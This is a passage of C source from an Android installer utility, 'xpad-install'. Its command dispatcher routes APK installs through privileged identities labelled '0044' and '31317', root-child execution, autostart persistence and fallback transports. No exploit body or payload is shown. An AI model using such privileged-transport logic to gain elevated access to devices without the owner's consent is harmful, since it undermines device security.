    int repair = ensure_znxrun(argv[0]);
    if (repair == ZNXRUN_ENSURE_PENDING) {
      puts("target_apk_installed=false");
      fprintf(stderr,
              "xpad-install: 0044 repair is still pending; target APK was not installed\n");
      return repair;
    }
    if (repair != 0) {
      fprintf(stderr,
              "xpad-install: 0044 repair failed; target APK was not installed\n");
      return repair;
    }
  }

  fprintf(stderr,
          "xpad-install: installing through managed 0044 (backend=%s)\n",
          backend);
  int rc = run_java_as_znxrun(argc - 1, argv + 1);
  if (rc == 0) return finalize_apk_persistence(argv[0], rc, "0044");

  /* A failed target APK must never be committed through 31317. If the failed
   * operation also damaged the managed identity, repair it once and retry the
   * same 0044 path. A healthy 0044 with an APK/backend error is returned as-is.
   */
  if (getuid() == 2000 && znxrun_status(0) != 0) {
    fprintf(stderr,
            "xpad-install: 0044 became unhealthy; repairing before one 0044 retry\n");
    int repair = ensure_znxrun(argv[0]);
    if (repair != 0) return repair;
    rc = run_java_as_znxrun(argc - 1, argv + 1);
    if (rc == 0) return finalize_apk_persistence(argv[0], rc, "0044-retry");
  }
  fprintf(stderr,
          "xpad-install: 0044 installation failed; 31317 target-APK fallback is disabled\n");
  return rc < 0 ? 77 : rc;
}

int main(int argc, char **argv) {
  if (argc >= 2 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h") ||
                    !strcmp(argv[1], "help"))) {
    usage(stdout);
    return 0;
  }
  if (argc == 1) {
    usage(stderr);
    return 64;
  }
  if (!strcmp(argv[1], "--version") || !strcmp(argv[1], "version")) {
    if (argc != 2) { usage(stderr); return 64; }
    printf("xpad-install %s\n", XPAD_INSTALL_VERSION);
    return 0;
  }
  if (!strcmp(argv[1], "self-test")) {
    if (argc != 2) { usage(stderr); return 64; }
    return native_self_test();
  }
  if (!strcmp(argv[1], "doctor")) {
    if (argc != 2) { usage(stderr); return 64; }
    return native_doctor();
  }
  if (!strcmp(argv[1], "verify")) return native_verify(argc, argv);
  if (!strcmp(argv[1], "cleanup")) {
    if (argc != 2) { usage(stderr); return 64; }
    return native_cleanup();
  }
  if (!strcmp(argv[1], "znxrun") && argc >= 3 && !strcmp(argv[2], "status")) {
    if (argc != 3) { usage(stderr); return 64; }
    return znxrun_status(1);
  }
  if (!strcmp(argv[1], "znxrun") && argc >= 3 && !strcmp(argv[2], "ensure")) {
    if (argc != 3) { usage(stderr); return 64; }
    return ensure_znxrun(argv[0]);
  }
  if (!strcmp(argv[1], "znxrun") && argc >= 3 && !strcmp(argv[2], "create")) {
    const char *package_name = option_value(argc - 1, argv + 1, "--package");
    if (!package_name || !*package_name) {
      fprintf(stderr, "xpad-install: generic znxrun create requires --package PACKAGE; "
                      "use 'znxrun ensure' for the managed anchor\n");
      return 64;
    }
    return run_znxrun_mutation(argc, argv, package_name);
  }
  if (argc >= 2 && !strcmp(argv[1], "--root-child")) {
    if (argc >= 3 && (!strcmp(argv[2], "activate") || !strcmp(argv[2], "serve"))) {
      return serve(argc - 2, argv + 2);
    }
    return ionstack_root_java(argc - 2, argv + 2);
  }
  if (!strcmp(argv[1], "serve")) return serve(argc - 1, argv + 1);
  if (!strcmp(argv[1], "autostart")) {
    if (argc != 3 || strcmp(argv[2], "enable")) {
      usage(stderr);
      return 64;
    }
    return configure_autostart();
  }
  if (!strcmp(argv[1], "activate")) {
    const char *starter, *apk;
    int valid = parse_service_args(argc - 1, argv + 1, &starter, &apk);
    if (valid != 0) return valid;
    int persistent = configure_autostart();
    if (persistent != 0) return persistent;
    /*
     * BoomInstaller's Shizuku control plane is a standard root/shell service.
     * The managed 0044 identity belongs exclusively to APK installation, and
     * the guarded 31317 runner may only repair that installer identity.
     * Never turn either installer identity into a persistent service runtime.
     */
    return serve(argc - 1, argv + 1);
  }
  if (!strcmp(argv[1], "install") || !strcmp(argv[1], "upgrade"))
    return install_via_managed_0044(argc, argv);

  /* The only remaining public command that may select a privileged transport
   * is the explicit 0044 repair preflight. Reject typos and unknown commands
   * before they can ever reach IonStack or the guarded 31317 runner.
   */
  if (strcmp(argv[1], "znxrun") || argc != 3 ||
      strcmp(argv[2], "preflight")) {
    fprintf(stderr, "xpad-install: unknown command: %s\n", argv[1]);
    usage(stderr);
    return 64;
  }
  if (getuid() == 0) {
    return ionstack_root_java(argc - 1, argv + 1);
  }
  int root = ionstack_delegate(argc, argv);
  if (root >= 0) return root;
  return system_transport(argc, argv);
}
